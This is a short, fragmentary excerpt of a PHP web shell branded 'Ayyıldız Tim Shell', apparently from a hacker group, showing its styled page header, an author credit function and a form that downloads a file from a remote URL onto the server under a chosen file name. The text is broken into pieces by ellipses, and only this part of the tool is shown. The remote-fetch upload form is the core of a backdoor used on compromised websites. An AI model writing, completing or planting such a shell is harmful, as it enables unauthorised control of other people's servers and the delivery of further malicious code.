...
<html>
<head>
	<title>Ayyıldız Tim Shell</title>
</head>
<body bgcolor="#511d52" text="#ffffff">
...
<center>
<font face="Bungee" size="5">Ayyıldız Tim İnternational Force</font></center>
...
function author() {
	echo "<center><br>Sahabettin</center>";
	exit();
}
...
<input type="text" name="darilink" class="up" placeholder="https://site.com/">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
echo "</table><br>";
